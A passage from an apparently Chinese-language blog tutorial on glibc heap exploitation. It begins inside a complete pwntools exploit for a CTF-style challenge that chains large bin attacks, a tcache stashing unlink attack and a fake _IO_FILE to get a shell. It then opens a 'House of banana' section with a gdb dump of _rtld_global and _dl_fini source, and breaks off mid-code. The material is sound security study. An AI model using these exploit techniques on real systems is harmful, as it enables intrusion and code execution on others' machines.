class="number">0x160</span>)              <span class="comment"># peppa index 8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):      <span class="comment"># fill 0x130 tcache, peppa index 9~15</span></span><br><span class="line">        add(<span class="number">0x160</span>)</span><br><span class="line">        delete(i + <span class="number">9</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io)</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    view(<span class="number">8</span>)                 <span class="comment"># get libc base address</span></span><br><span class="line">    io.recv(<span class="number">0x10</span>)</span><br><span class="line">    libc_base = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x1ECBE0</span></span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    __free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    _IO_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0xB0</span>)               <span class="comment"># mummy index 6, split peppa #8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取堆地址</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io)</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    view(<span class="number">1</span>)</span><br><span class="line">    io.recv(<span class="number">0x10</span>)</span><br><span class="line">    heap_address = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)        <span class="comment"># get a heap address</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc base: &#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;system: &#x27;</span>, <span class="built_in">hex</span>(system))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;__free_hook: &#x27;</span>, <span class="built_in">hex</span>(__free_hook))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;_IO_list_all: &#x27;</span>, <span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;heap address: &#x27;</span>, <span class="built_in">hex</span>(heap_address))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">first_largebin_attack</span>():</span><br><span class="line">    <span class="comment"># first large bin attack</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x440</span>)     <span class="comment"># mummy index = 7</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 16</span></span><br><span class="line">    add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 17</span></span><br><span class="line">    add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 18</span></span><br><span class="line">    add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 19</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">0x450</span>)     <span class="comment"># mummy index = 8, switch mummy #7 into large bin</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">17</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">7</span>, (p64(__free_hook - <span class="number">0x18</span> - <span class="number">0x18</span>) * <span class="number">2</span>) + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x440</span> // <span class="number">0x30</span> * <span class="number">0x10</span> - <span class="number">0x10</span>))</span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">0xF0</span>)    <span class="comment"># daddy index = 0, complete first large bin attack</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">second_largebin_attack</span>():</span><br><span class="line">    <span class="comment"># second large bin attack</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">19</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">7</span>, (p64(_IO_list_all - <span class="number">0x20</span>) * <span class="number">2</span>) + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x440</span> // <span class="number">0x30</span> * <span class="number">0x10</span> - <span class="number">0x10</span>))</span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">0xF0</span>)    <span class="comment"># daddy index = 1, complete first large bin attack</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tcache_stashing_unlink_attack</span>():</span><br><span class="line">    <span class="comment"># tcache stashing unlink attack</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">8</span>, <span class="string">b&#x27;0&#x27;</span> * <span class="number">0x40</span> + p64(heap_address + <span class="number">0x410</span>) + p64(__free_hook - <span class="number">0x28</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x230</span>)   <span class="comment"># daddy index = 2</span></span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x430</span>)   <span class="comment"># daddy index = 3</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">7</span>, p64(heap_address + <span class="number">0x19E0</span>) * <span class="number">2</span> + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">0xA0</span>)   <span class="comment"># daddy index = 4, trigger tcache stashing unlink attack</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">    fake_IO_FILE_complete = p64(<span class="number">0</span>) * <span class="number">2</span>  <span class="comment"># _IO_read_end (0x10), _IO_read_base (0x18)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(<span class="number">1</span>)     <span class="comment"># _IO_write_base (0x20)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(<span class="number">0xFFFF_FFFF_FFFF</span>) <span class="comment"># _IO_write_ptr (0x28)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(<span class="number">0</span>)     <span class="comment"># _IO_write_end (0x30)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(heap_address + <span class="number">0x19E0</span> + <span class="number">0xD0</span>)  <span class="comment"># _IO_buf_base (0x38)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(heap_address + <span class="number">0x19E0</span> + <span class="number">0xD0</span> + <span class="number">30</span>)  <span class="comment"># _IO_buf_end (0x40)</span></span><br><span class="line">    fake_IO_FILE_complete = fake_IO_FILE_complete.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE_complete += p64(<span class="number">0</span>)     <span class="comment"># _mode (0xB0)</span></span><br><span class="line">    fake_IO_FILE_complete = fake_IO_FILE_complete.ljust(<span class="number">0xC0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE_complete += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    fake_IO_FILE_complete += p64(libc_base + <span class="number">0x1E9560</span>)</span><br><span class="line">    payload = fake_IO_FILE_complete + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="number">2</span> * p64(system)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Gift:&#x27;</span>, payload)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    leak_addr()</span><br><span class="line">    first_largebin_attack()</span><br><span class="line">    second_largebin_attack()</span><br><span class="line">    tcache_stashing_unlink_attack()</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;user:\n&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure></div>

<h1 id="House-of-banana"><a href="#House-of-banana" class="headerlink" title="House of banana"></a>House of banana</h1><p><code>glibc &gt;= 2.23</code></p>
<h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><p>在 <code>ld.so</code> 里，存在一个 <code>_rtld_global</code> 指针，指向 <code>rtld_global</code> 结构体，程序通过 <code>exit</code> 退出时，会调用 <code>rtld_global</code> 的结构体中的一系列函数来进行诸如恢复寄存器，清除缓冲区等操作。</p>
<p>其<a class="link"   href="https://elixir.bootlin.com/glibc/glibc-2.31/source/sysdeps/generic/ldsodefs.h#L308" >结构体定义 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">glibc-2.23</span></span><br><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">p _rtld_global</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = &#123;</span></span><br><span class="line">  _dl_ns = &#123;&#123;</span><br><span class="line">      _ns_loaded = 0x7ffff7ffe168,</span><br><span class="line">      _ns_nloaded = 0x4,</span><br><span class="line">      _ns_main_searchlist = 0x7ffff7ffe420,</span><br><span class="line">      _ns_global_scope_alloc = 0x0,</span><br><span class="line">      _ns_unique_sym_table = &#123;</span><br><span class="line">        lock = &#123;</span><br><span class="line">          mutex = &#123;</span><br><span class="line">            __data = &#123;</span><br><span class="line">              __lock = 0x0,</span><br><span class="line">              __count = 0x0,</span><br><span class="line">              __owner = 0x0,</span><br><span class="line">              __nusers = 0x0,</span><br><span class="line">              __kind = 0x1,</span><br><span class="line">              __spins = 0x0,</span><br><span class="line">              __elision = 0x0,</span><br><span class="line">              __list = &#123;</span><br><span class="line">                __prev = 0x0,</span><br><span class="line">                __next = 0x0</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            __size = &#x27;\000&#x27; &lt;repeats 16 times&gt;, &quot;\001&quot;, &#x27;\000&#x27; &lt;repeats 22 times&gt;,</span><br><span class="line">            __align = 0x0</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        entries = 0x0,</span><br><span class="line">        size = 0x0,</span><br><span class="line">        n_elements = 0x0,</span><br><span class="line">        free = 0x0</span><br><span class="line">      &#125;,</span><br><span class="line">      _ns_debug = &#123;</span><br><span class="line">        r_version = 0x0,</span><br><span class="line">        r_map = 0x0,</span><br><span class="line">        r_brk = 0x0,</span><br><span class="line">        r_state = RT_CONSISTENT,</span><br><span class="line">        r_ldbase = 0x0</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, &#123;</span><br><span class="line">      _ns_loaded = 0x0,</span><br><span class="line">      _ns_nloaded = 0x0,</span><br><span class="line">      _ns_main_searchlist = 0x0,</span><br><span class="line">      _ns_global_scope_alloc = 0x0,</span><br><span class="line">      _ns_unique_sym_table = &#123;</span><br><span class="line">        lock = &#123;</span><br><span class="line">          mutex = &#123;</span><br><span class="line">            __data = &#123;</span><br><span class="line">              __lock = 0x0,</span><br><span class="line">              __count = 0x0,</span><br><span class="line">              __owner = 0x0,</span><br><span class="line">              __nusers = 0x0,</span><br><span class="line">              __kind = 0x0,</span><br><span class="line">              __spins = 0x0,</span><br><span class="line">              __elision = 0x0,</span><br><span class="line">              __list = &#123;</span><br><span class="line">                __prev = 0x0,</span><br><span class="line">                __next = 0x0</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            __size = &#x27;\000&#x27; &lt;repeats 39 times&gt;,</span><br><span class="line">            __align = 0x0</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        entries = 0x0,</span><br><span class="line">        size = 0x0,</span><br><span class="line">        n_elements = 0x0,</span><br><span class="line">        free = 0x0</span><br><span class="line">      &#125;,</span><br><span class="line">      _ns_debug = &#123;</span><br><span class="line">        r_version = 0x0,</span><br><span class="line">        r_map = 0x0,</span><br><span class="line">        r_brk = 0x0,</span><br><span class="line">        r_state = RT_CONSISTENT,</span><br><span class="line">        r_ldbase = 0x0</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; &lt;repeats 15 times&gt;&#125;,</span><br><span class="line">  _dl_nns = 0x1,</span><br><span class="line">  _dl_load_lock = &#123;</span><br><span class="line">    mutex = &#123;</span><br><span class="line">      __data = &#123;</span><br><span class="line">        __lock = 0x0,</span><br><span class="line">        __count = 0x0,</span><br><span class="line">        __owner = 0x0,</span><br><span class="line">        __nusers = 0x0,</span><br><span class="line">        __kind = 0x1,</span><br><span class="line">        __spins = 0x0,</span><br><span class="line">        __elision = 0x0,</span><br><span class="line">        __list = &#123;</span><br><span class="line">          __prev = 0x0,</span><br><span class="line">          __next = 0x0</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      __size = &#x27;\000&#x27; &lt;repeats 16 times&gt;, &quot;\001&quot;, &#x27;\000&#x27; &lt;repeats 22 times&gt;,</span><br><span class="line">      __align = 0x0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  _dl_load_write_lock = &#123;</span><br><span class="line">    mutex = &#123;</span><br><span class="line">      __data = &#123;</span><br><span class="line">        __lock = 0x0,</span><br><span class="line">        __count = 0x0,</span><br><span class="line">        __owner = 0x0,</span><br><span class="line">        __nusers = 0x0,</span><br><span class="line">        __kind = 0x1,</span><br><span class="line">        __spins = 0x0,</span><br><span class="line">        __elision = 0x0,</span><br><span class="line">        __list = &#123;</span><br><span class="line">          __prev = 0x0,</span><br><span class="line">          __next = 0x0</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      __size = &#x27;\000&#x27; &lt;repeats 16 times&gt;, &quot;\001&quot;, &#x27;\000&#x27; &lt;repeats 22 times&gt;,</span><br><span class="line">      __align = 0x0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  _dl_load_adds = 0x4,</span><br><span class="line">  _dl_initfirst = 0x0,</span><br><span class="line">  _dl_cpuclock_offset = 0x117f04aeec,</span><br><span class="line">  _dl_profile_map = 0x0,</span><br><span class="line">  _dl_num_relocations = 0x53,</span><br><span class="line">  _dl_num_cache_relocations = 0x3,</span><br><span class="line">  _dl_all_dirs = 0x7ffff7ffec20,</span><br><span class="line">  _dl_error_catch_tsd = 0x7ffff7dd7c80 &lt;_dl_initial_error_catch_tsd&gt;,</span><br><span class="line">  _dl_rtld_map = &#123;</span><br><span class="line">    l_addr = 0x7ffff7dd7000,</span><br><span class="line">    l_name = 0x3ff2a8 &quot;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;,</span><br><span class="line">    l_ld = 0x7ffff7ffce80,</span><br><span class="line">    l_next = 0x0,</span><br><span class="line">    l_prev = 0x7ffff7ff5000,</span><br><span class="line">    l_real = 0x7ffff7ffd9d8 &lt;_rtld_global+2456&gt;,</span><br><span class="line">    l_ns = 0x0,</span><br><span class="line">    l_libname = 0x7ffff7ffe020 &lt;_dl_rtld_libname&gt;,</span><br><span class="line">    l_info = &#123;0x0, 0x0, 0x7ffff7ffcf00, 0x7ffff7ffcef0, 0x7ffff7ffce90,</span><br><span class="line">      0x7ffff7ffceb0, 0x7ffff7ffcec0, 0x7ffff7ffcf30, 0x7ffff7ffcf40,</span><br><span class="line">      0x7ffff7ffcf50, 0x7ffff7ffced0, 0x7ffff7ffcee0, 0x0, 0x0,</span><br><span class="line">      0x7ffff7ffce80, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7ffcf10, 0x0, 0x0,</span><br><span class="line">      0x7ffff7ffcf20, 0x0 &lt;repeats 12 times&gt;, 0x7ffff7ffcf70, 0x7ffff7ffcf60,</span><br><span class="line">      0x0, 0x0, 0x7ffff7ffcf90, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,</span><br><span class="line">      0x7ffff7ffcf80, 0x0 &lt;repeats 25 times&gt;, 0x7ffff7ffcea0&#125;,</span><br><span class="line">    l_phdr = 0x7ffff7dd7040,</span><br><span class="line">    l_entry = 0x0,</span><br><span class="line">    l_phnum = 0x7,</span><br><span class="line">    l_ldnum = 0x0,</span><br><span class="line">    l_searchlist = &#123;</span><br><span class="line">      r_list = 0x0,</span><br><span class="line">      r_nlist = 0x0</span><br><span class="line">    &#125;,</span><br><span class="line">    l_symbolic_searchlist = &#123;</span><br><span class="line">      r_list = 0x0,</span><br><span class="line">      r_nlist = 0x0</span><br><span class="line">    &#125;,</span><br><span class="line">    l_loader = 0x0,</span><br><span class="line">    l_versions = 0x7ffff7ff58b8,</span><br><span class="line">    l_nversions = 0x6,</span><br><span class="line">    l_nbuckets = 0x11,</span><br><span class="line">    l_gnu_bitmask_idxbits = 0x3,</span><br><span class="line">    l_gnu_shift = 0x8,</span><br><span class="line">    l_gnu_bitmask = 0x7ffff7dd72c0,</span><br><span class="line">    &#123;</span><br><span class="line">      l_gnu_buckets = 0x7ffff7dd72e0,</span><br><span class="line">      l_chain = 0x7ffff7dd72e0</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      l_gnu_chain_zero = 0x7ffff7dd731c,</span><br><span class="line">      l_buckets = 0x7ffff7dd731c</span><br><span class="line">    &#125;,</span><br><span class="line">    l_direct_opencount = 0x0,</span><br><span class="line">    l_type = lt_library,</span><br><span class="line">    l_relocated = 0x1,</span><br><span class="line">    l_init_called = 0x1,</span><br><span class="line">    l_global = 0x1,</span><br><span class="line">    l_reserved = 0x0,</span><br><span class="line">    l_phdr_allocated = 0x0,</span><br><span class="line">    l_soname_added = 0x0,</span><br><span class="line">    l_faked = 0x0,</span><br><span class="line">    l_need_tls_init = 0x0,</span><br><span class="line">    l_auditing = 0x0,</span><br><span class="line">    l_audit_any_plt = 0x0,</span><br><span class="line">    l_removed = 0x0,</span><br><span class="line">    l_contiguous = 0x0,</span><br><span class="line">    l_symbolic_in_local_scope = 0x0,</span><br><span class="line">    l_free_initfini = 0x0,</span><br><span class="line">    l_rpath_dirs = &#123;</span><br><span class="line">      dirs = 0x0,</span><br><span class="line">      malloced = 0x0</span><br><span class="line">    &#125;,</span><br><span class="line">    l_reloc_result = 0x0,</span><br><span class="line">    l_versyms = 0x7ffff7dd77f0,</span><br><span class="line">    l_origin = 0x0,</span><br><span class="line">    l_map_start = 0x7ffff7dd7000,</span><br><span class="line">    l_map_end = 0x7ffff7ffe168,</span><br><span class="line">    l_text_end = 0x7ffff7df57c0,</span><br><span class="line">    l_scope_mem = &#123;0x0, 0x0, 0x0, 0x0&#125;,</span><br><span class="line">    l_scope_max = 0x0,</span><br><span class="line">    l_scope = 0x0,</span><br><span class="line">    l_local_scope = &#123;0x0, 0x0&#125;,</span><br><span class="line">    l_file_id = &#123;</span><br><span class="line">      dev = 0x0,</span><br><span class="line">      ino = 0x0</span><br><span class="line">    &#125;,</span><br><span class="line">    l_runpath_dirs = &#123;</span><br><span class="line">      dirs = 0x0,</span><br><span class="line">      malloced = 0x0</span><br><span class="line">    &#125;,</span><br><span class="line">    l_initfini = 0x0,</span><br><span class="line">    l_reldeps = 0x0,</span><br><span class="line">    l_reldepsmax = 0x0,</span><br><span class="line">    l_used = 0x1,</span><br><span class="line">    l_feature_1 = 0x0,</span><br><span class="line">    l_flags_1 = 0x0,</span><br><span class="line">    l_flags = 0x0,</span><br><span class="line">    l_idx = 0x0,</span><br><span class="line">    l_mach = &#123;</span><br><span class="line">      plt = 0x0,</span><br><span class="line">      gotplt = 0x0,</span><br><span class="line">      tlsdesc_table = 0x0</span><br><span class="line">    &#125;,</span><br><span class="line">    l_lookup_cache = &#123;</span><br><span class="line">      sym = 0x7ffff7dd7450,</span><br><span class="line">      type_class = 0x1,</span><br><span class="line">      value = 0x7ffff7ff5000,</span><br><span class="line">      ret = 0x7ffff7a13ba0</span><br><span class="line">    &#125;,</span><br><span class="line">    l_tls_initimage = 0x0,</span><br><span class="line">    l_tls_initimage_size = 0x0,</span><br><span class="line">    l_tls_blocksize = 0x0,</span><br><span class="line">    l_tls_align = 0x0,</span><br><span class="line">    l_tls_firstbyte_offset = 0x0,</span><br><span class="line">    l_tls_offset = 0x0,</span><br><span class="line">    l_tls_modid = 0x0,</span><br><span class="line">    l_tls_dtor_count = 0x0,</span><br><span class="line">    l_relro_addr = 0x225bc0,</span><br><span class="line">    l_relro_size = 0x440,</span><br><span class="line">    l_serial = 0x0,</span><br><span class="line">    l_audit = 0x7ffff7ffde48 &lt;_rtld_global+3592&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  audit_data = &#123;&#123;</span><br><span class="line">      cookie = 0x0,</span><br><span class="line">      bindflags = 0x0</span><br><span class="line">    &#125; &lt;repeats 16 times&gt;&#125;,</span><br><span class="line">  _dl_rtld_lock_recursive = 0x7ffff7dd7c90 &lt;rtld_lock_default_lock_recursive&gt;,</span><br><span class="line">  _dl_rtld_unlock_recursive = 0x7ffff7dd7ca0 &lt;rtld_lock_default_unlock_recursive&gt;,</span><br><span class="line">  _dl_make_stack_executable_hook = 0x7ffff7deb0e0 &lt;__GI__dl_make_stack_executable&gt;,</span><br><span class="line">  _dl_stack_flags = 0x6,</span><br><span class="line">  _dl_tls_dtv_gaps = 0x0,</span><br><span class="line">  _dl_tls_max_dtv_idx = 0x1,</span><br><span class="line">  _dl_tls_dtv_slotinfo_list = 0x7ffff7ff5948,</span><br><span class="line">  _dl_tls_static_nelem = 0x1,</span><br><span class="line">  _dl_tls_static_size = 0x1000,</span><br><span class="line">  _dl_tls_static_used = 0x78,</span><br><span class="line">  _dl_tls_static_align = 0x40,</span><br><span class="line">  _dl_initial_dtv = 0x7ffff7ff3010,</span><br><span class="line">  _dl_tls_generation = 0x1,</span><br><span class="line">  _dl_init_static_tls = 0x7ffff7de3130 &lt;_dl_nothread_init_static_tls&gt;,</span><br><span class="line">  _dl_wait_lookup_done = 0x0,</span><br><span class="line">  _dl_scope_free_list = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们看到里面有多个 <code>_dl_ns</code> 结构体，调试发现，该结构体存储着的实际就是 <code>elf</code> 各段的符号结构体。当调用到 <code>_dl_fini</code> 函数时，会执行每个 <code>so</code> 中注册的 <code>fini</code> 函数，其中主要是 <code>fini_array</code> 段的动态链接结构体指针，该结构体实际在 <code>_dl_fini</code> 中被使用。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">internal_function</span><br><span class="line">_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Lots of fun ahead.  We have to call the destructors for all still</span></span><br><span class="line"><span class="comment">     loaded objects, in all namespaces.  The problem is that the ELF</span></span><br><span class="line"><span class="comment">     specification now demands that dependencies between the modules</span></span><br><span class="line"><span class="comment">     are taken into account.  I.e., the destructor for a module is</span></span><br><span class="line"><span class="comment">     called before the ones for any of its dependencies.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     To make things more complicated, we cannot simply use the reverse</span></span><br><span class="line"><span class="comment">     order of the constructors.  Since the user might have loaded objects</span></span><br><span class="line"><span class="comment">     using `dlopen&#x27; there are possibly several other modules with its</span></span><br><span class="line"><span class="comment">     dependencies to be taken into account.  Therefore we have to start</span></span><br><span class="line"><span class="comment">     determining the order of the modules once again from the beginning.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We run the destructors of the main namespaces last.  As for the</span></span><br><span class="line"><span class="comment">     other namespaces, we pick run the destructors in them in reverse</span></span><br><span class="line"><span class="comment">     order of the namespace ID.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="type">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line"> again:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = <span class="built_in">GL</span>(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">      __rtld_lock_lock_recursive (<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> nloaded = <span class="built_in">GL</span>(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">      <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment">	 auditing DSOs.  */</span></span><br><span class="line">      <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">	  || <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	  )</span><br><span class="line">	__rtld_lock_unlock_recursive (<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Now we can allocate an array to hold all the pointers and</span></span><br><span class="line"><span class="comment">	     copy the pointers in.  */</span></span><br><span class="line">	  <span class="keyword">struct</span> link_map *maps[nloaded];</span><br><span class="line"></span><br><span class="line">	  <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">	  <span class="keyword">struct</span> <span class="title class_">link_map</span> *l;</span><br><span class="line">	  <span class="built_in">assert</span> (nloaded != <span class="number">0</span> || <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">	  <span class="keyword">for</span> (l = <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">	    <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">	    <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">	      &#123;</span><br><span class="line">		<span class="built_in">assert</span> (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">		maps[i] = l;</span><br><span class="line">		l-&gt;l_idx = i;</span><br><span class="line">		++i;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">		   are not dlclose()ed from underneath us.  */</span></span><br><span class="line">		++l-&gt;l_direct_opencount;</span><br><span class="line">	      &#125;</span><br><span class="line">	  <span class="built_in">assert</span> (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">	  <span class="built_in">assert</span> (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">	  <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Now we have to do the sorting.  */</span></span><br><span class="line">	  _dl_sort_fini (maps, nmaps, <span class="literal">NULL</span>, ns);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* We do not rely on the linked list of loaded object anymore</span></span><br><span class="line"><span class="comment">	     from this point on.  We have our own list here (maps).  The</span></span><br><span class="line"><span class="comment">	     various members of this list cannot vanish since the open</span></span><br><span class="line"><span class="comment">	     count is too high and will be decremented in this loop.  So</span></span><br><span class="line"><span class="comment">	     we release the lock so that some code which might be called</span></span><br><span class="line"><span class="comment">	     from a destructor can directly or indirectly access the</span></span><br><span class="line"><span class="comment">	     lock.  */</span></span><br><span class="line">	  __rtld_lock_unlock_recursive (<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* &#x27;maps&#x27; now contains the objects in the right order.  Now</span></span><br><span class="line"><span class="comment">	     call the destructors.  We have to process this array from</span></span><br><span class="line"><span class="comment">	     the front.  */</span></span><br><span class="line">	  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">struct</span> <span class="title class_">link_map</span> *l = maps[i];</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">		  l-&gt;l_init_called = <span class="number">0</span>;</span><br><span 